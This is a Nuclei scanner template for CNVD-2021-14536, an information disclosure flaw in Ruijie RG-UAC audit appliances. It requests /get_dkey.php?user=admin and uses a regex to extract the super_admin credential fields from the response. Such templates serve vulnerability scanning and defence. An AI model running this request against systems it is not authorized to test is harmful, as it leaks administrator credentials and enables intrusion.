id: Ruijie_UAC_leakage
info:
  author: daffainfo
  name: Ruijie RG-UAC Unified Internet Behavior Management Audit System - Information
    Disclosure
  reference:
  - https://github.com/projectdiscovery/nuclei-templates/blob/master/cnvd/2021/CNVD-2021-14536.yaml
  severity: high
  tags: ruijie,cnvd,cnvd2021,disclosure
requests:
- extractors:
  - group: 1
    part: body
    regex:
    - '"role":"super_admin",(["a-z:,0-9]+),"lastpwdtime":'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"pre_define"'
    - '"auth_method"'
    - '"name"'
    - '"password"'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/get_dkey.php?user=admin'
